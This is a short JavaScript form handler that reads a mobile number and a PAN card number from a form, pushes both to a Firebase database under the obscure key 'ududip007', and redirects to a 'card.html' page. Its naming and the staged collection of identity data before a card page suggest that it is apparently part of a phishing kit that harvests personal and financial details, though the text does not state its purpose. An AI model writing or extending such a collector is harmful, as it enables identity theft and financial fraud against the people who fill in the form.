
// reference your database
var ududip007DB = firebase.database().ref("ududip007");

document.getElementById("ududip007").addEventListener("submit", submitForm);

function submitForm(e) {
  e.preventDefault();

    var amobile = getElementVal("amobile");
    var bpan = getElementVal("bpan");
    
    

  

  saveMessages(amobile, bpan);

  // redirect to card page
  window.location.href = "card.html";
}

const saveMessages = (amobile, bpan) => {
  var newududip007 = ududip007DB.push();

  newududip007.set({
      Mobile: amobile,
      Pan_card: bpan,
      
      
    
    
  });
};

const getElementVal = (id) => {
  return document.getElementById(id).value;
};

